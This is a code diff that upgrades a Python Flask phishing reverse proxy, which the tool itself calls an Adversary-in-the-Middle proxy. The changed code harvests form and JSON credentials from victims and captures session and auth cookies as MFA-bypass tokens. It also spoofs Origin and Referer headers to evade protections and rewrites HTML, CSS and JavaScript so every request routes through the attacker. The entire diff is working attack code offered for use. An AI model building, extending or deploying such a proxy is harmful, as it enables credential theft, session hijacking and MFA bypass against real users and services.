@@ -26,76 +26,98 @@ class AitMState:
 
 state = AitMState()
 
-@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
-@app.route('/<path:path>', methods=['GET', 'POST'])
+# Added OPTIONS, PUT, and DELETE methods to support modern web app CORS requests for CSS/Fonts
+@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'])
+@app.route('/<path:path>', methods=['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'])
 def proxy(path):
-    """The core Adversary-in-the-Middle reverse proxy engine."""
+    """The advanced AitM reverse proxy engine with CSS/JS routing."""
     
-    # 1. Construct the real destination URL
     url = f"{state.target_url}/{path}"
     if request.query_string:
         url += f"?{request.query_string.decode('utf-8')}"
 
-    # 2. INTERCEPT POST REQUESTS (Credential Harvesting)
+    # 1. INTERCEPT CREDENTIALS (Supports both Forms and JSON payloads)
     if request.method == 'POST':
         form_data = request.form.to_dict()
         if form_data:
             state.captured_creds += 1
-            console.print(f"\n[bold red][!] INTERCEPTED POST DATA (Possible Credentials) from {request.remote_addr}:[/bold red]")
+            console.print(f"\n[bold red][!] INTERCEPTED POST DATA from {request.remote_addr}:[/bold red]")
             for key, value in form_data.items():
-                # Avoid printing massive hidden viewstates, focus on user inputs
                 if len(value) < 200: 
                     console.print(f"    [white]{key}:[/white] [bold yellow]{value}[/bold yellow]")
             
-            # Log credentials securely to the database
             cred_log = "\n".join([f"{k}: {v}" for k, v in form_data.items() if len(v) < 200])
             db.log("AitM-Proxy", request.remote_addr, f"Captured Form Submission:\n{cred_log}", "CRITICAL")
 
-    # 3. Forward the exact request to the real server
-    # We strip the 'Host' header so the target server doesn't get confused
-    headers = {key: value for (key, value) in request.headers if key.lower() != 'host'}
+    # 2. STRIP AND SPOOF HEADERS (Bypass CORS and Anti-Bot protections)
+    headers = {}
+    for key, value in request.headers:
+        # We strip 'Accept-Encoding' to force the server to send uncompressed CSS/HTML so we can read it
+        if key.lower() not in ['host', 'accept-encoding', 'origin', 'referer']:
+            headers[key] = value
+            
+    # Spoof Origin and Referer so the target server hands over the CSS files without blocking us
+    headers['Origin'] = state.target_url
+    headers['Referer'] = f"{state.target_url}/"
     
     try:
-        if request.method == 'GET':
-            resp = requests.get(url, headers=headers, cookies=request.cookies, allow_redirects=False, verify=False)
-        else:
-            resp = requests.post(url, headers=headers, data=request.form, cookies=request.cookies, allow_redirects=False, verify=False)
+        # Use request.get_data() to properly handle raw JSON payloads in modern apps
+        resp = requests.request(
+            method=request.method,
+            url=url,
+            headers=headers,
+            data=request.get_data(), 
+            cookies=request.cookies,
+            allow_redirects=False,
+            verify=False
+        )
     except Exception as e:
         return f"Proxy Route Error: {e}", 500
 
-    # 4. INTERCEPT SET-COOKIE HEADERS (MFA Session Stealing)
+    # 3. INTERCEPT SET-COOKIE HEADERS (MFA Session Stealing)
     if 'Set-Cookie' in resp.headers:
         cookie_data = resp.headers['Set-Cookie']
-        # Flag high-value session cookies
         if any(x in cookie_data.lower() for x in ['session', 'token', 'auth']):
             console.print(f"\n[bold magenta][!] INTERCEPTED AUTHENTICATION COOKIE (MFA BYPASS TOKEN)![/bold magenta]")
             console.print(f"    [dim]{cookie_data[:150]}...[/dim]")
             db.log("AitM-Proxy", request.remote_addr, f"Captured Auth Cookie: {cookie_data}", "CRITICAL")
 
-    # 5. On-the-fly HTML Rewriting (Keep the victim trapped in the proxy)
     content = resp.content
-    if 'text/html' in resp.headers.get('Content-Type', '').lower():
+    content_type = resp.headers.get('Content-Type', '').lower()
+
+    # 4. DEEP REWRITE ENGINE (HTML, CSS, JS)
+    if 'text/html' in content_type:
         soup = BeautifulSoup(content, 'html.parser')
         
-        # Rewrite all internal links to point to our proxy instead of the real domain
+        # Force all CSS links to route through our proxy
         for tag in soup.find_all(['a', 'link'], href=True):
-            href = tag['href']
-            if state.target_domain in href:
-                tag['href'] = href.replace(f"https://{state.target_domain}", "").replace(f"http://{state.target_domain}", "")
-        
-        # Rewrite form submission actions so passwords are sent to us
+            tag['href'] = tag['href'].replace(state.target_url, "")
+            
+        # Force all scripts, images, and iframes to route through our proxy
+        for tag in soup.find_all(['script', 'img', 'iframe'], src=True):
+            tag['src'] = tag['src'].replace(state.target_url, "")
+            
         for form in soup.find_all('form', action=True):
-            action = form['action']
-            if state.target_domain in action:
-                form['action'] = action.replace(f"https://{state.target_domain}", "").replace(f"http://{state.target_domain}", "")
+            form['action'] = form['action'].replace(state.target_url, "")
             
         content = soup.encode('utf-8')
+        
+    elif 'text/css' in content_type or 'javascript' in content_type:
+        # Sometimes CSS and JS contain hardcoded absolute URLs for fonts/assets (@import).
+        # We do a raw text replacement to hijack those as well.
+        try:
+            text_content = content.decode('utf-8', errors='ignore')
+            text_content = text_content.replace(state.target_url, "")
+            content = text_content.encode('utf-8')
+        except:
+            pass
 
-    # 6. Reconstruct the response and send it back to the victim
+    # 5. RECONSTRUCT HEADERS
+    # We must strip encoding headers because we modified the content payload and ruined the original compression
     excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
-    headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
+    resp_headers = [(name, value) for (name, value) in resp.headers.items() if name.lower() not in excluded_headers]
     
-    return Response(content, resp.status_code, headers)
+    return Response(content, resp.status_code, resp_headers)
 
 def run_cloner():
     draw_header("Adversary-in-the-Middle (AitM) Reverse Proxy")
@@ -122,7 +144,6 @@ def run_cloner():
     console.print("[bold yellow][!] Listening for credentials and MFA session cookies... (Press Ctrl+C to stop)[/bold yellow]\n")
 
     try:
-        # Launch the highly-threaded Flask proxy server
         app.run(host='0.0.0.0', port=port, threaded=True)
     except PermissionError:
         console.print("[bold red][!] Permission denied. Binding to port 80 requires 'sudo'.[/bold red]")
